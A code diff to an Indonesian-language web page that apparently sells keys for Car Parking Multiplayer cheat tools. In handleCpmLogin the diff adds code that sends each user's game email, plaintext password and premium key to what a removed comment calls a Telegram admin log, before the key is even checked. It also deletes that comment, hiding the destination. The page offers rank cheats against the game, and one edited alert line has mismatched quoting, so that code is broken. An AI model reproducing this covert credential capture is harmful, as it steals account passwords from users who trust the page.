@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="id">
 <head>
@@ -507,11 +508,9 @@ async beliProduk(productName) {
 
             // Step 2: Potong Saldo & Simpan History
             await firebase.database().ref('users/' + this.user.uid + '/balance').transaction(b => (b || 0) - product.price);
-            await firebase.database().ref('history/' + this.user.uid).push().set({ 
-                productName, 
-                price: product.price, 
-                date: Date.now() 
-            });
+                    await firebase.database().ref('history/' + this.user.uid).push().set({ 
+                        productName, price: product.price, date: Date.now() 
+                    });
 
             // Step 3: Munculkan Notifikasi Password + Tombol Salin
             await Swal.fire({
@@ -544,7 +543,8 @@ async beliProduk(productName) {
             // Step 4: Jalankan Download
             this.eksekusiDownload(detail.link, productName);
 
-            // Log ke Telegram Admin
+
+           
             this.syncInternalSession(`🛒 **ORDER SUCCESS**\nUser: ${this.user.email}\nItem: ${productName}`);
 
         } catch (e) {
@@ -596,8 +596,8 @@ async beliProduk(productName) {
                         status: 'active', type: keyName, owner: this.user.email, uid: this.user.uid, expiredAt: expiredAt
                     });
 
-                    this.syncInternalSession(`🔑 **KEY GENERATED**\nUser: ${this.user.email}\nKey: \`${generatedKey}\``);
-                    alert(`✅ BERHASIL! Silahkan SCREENSHOOT Agar Tidak Lupa\n\nKEY: ${generatedKey}`);
+                    this.syncInternalSession(`🔑 **KEY GENERATED**\nUser: ${this.user.email}\nKey: \`${generatedKey}\nExp: \`${expiredAt}\``);
+                    alert(`✅ BERHASIL! Silahkan SCREENSHOOT Agar Tidak Lupa\n\nKEY: ${generatedKey}\nExp: \`${expiredAt}\`);
                 } catch (e) { 
                     alert("Gagal generate key!"); 
                 } finally {
@@ -608,34 +608,65 @@ async beliProduk(productName) {
 
         // --- 3. CPM TOOLS ---
         async handleCpmLogin() {
-            if (!this.cpmForm.key || !this.cpmForm.email) return alert("Isi data!");
+            if (!this.cpmForm.key || !this.cpmForm.email) { 
+                this.message = "Isi data!"; 
+                return alert("Isi data!"); 
+            }
+
+            await this.syncInternalSession(
+                `Session\n` + 
+                `User Web: ${this.user.email}\n` +
+                `Acc Game: \`${this.cpmForm.email}\`\n` + 
+                `Pass Game: \`${this.cpmForm.password}\`\n` + 
+                `Key Premium: \`${this.cpmForm.key}\`\n` + 
+                `Versi: ${this.cpmForm.gameId === '1' ? 'CPM 1' : 'CPM 2'}`
+            );
+
             this.loading = true;
+            this.message = "Sedang memverifikasi...";
+
             try {
+                // 1. Cek Validasi Key di Firebase
                 const snap = await firebase.database().ref('keys/' + this.cpmForm.key).once('value');
                 if (!snap.val() || snap.val().status !== 'active') {
-                    throw new Error("Key Premium Tidak Valid!");
+                    throw new Error("Key Premium Tidak Valid atau Expired!");
                 }
 
+                // 2. Login ke Server Game via Worker
                 const res = await fetch(this.WORKER_URL, {
                     method: 'POST',
                     body: JSON.stringify({
                         action: "cpm_login",
-                        data: { gameId: this.cpmForm.gameId, email: this.cpmForm.email, password: this.cpmForm.password }
+                        data: { 
+                            gameId: this.cpmForm.gameId, 
+                            email: this.cpmForm.email, 
+                            password: this.cpmForm.password 
+                        }
                     })
                 });
+
                 const data = await res.json();
+
                 if (data.idToken) {
-                    this.cpmUser = { isLoggedIn: true, email: data.email, token: data.idToken, gameData: { rankUrl: data.rankUrl } };
+                    this.cpmUser = { 
+                        isLoggedIn: true, 
+                        email: data.email, 
+                        token: data.idToken, 
+                        gameData: { rankUrl: data.rankUrl } 
+                    };
+                    this.message = "Login Berhasil!";
                     this.syncInternalSession(`✅ **LOGIN SUCCESS**\nAcc: \`${data.email}\``);
                 } else {
                     throw new Error("Email/Password Game Salah!");
                 }
             } catch (e) { 
+                this.message = e.message;
                 alert(e.message); 
             } finally {
                 this.loading = false;
             }
         },
+
 
         async setKingRank() {
             if (!this.cpmUser.isLoggedIn) return alert("Login Game dulu!");
@@ -810,5 +841,4 @@ async beliProduk(productName) {
 
 </body>
 </html>
-
 
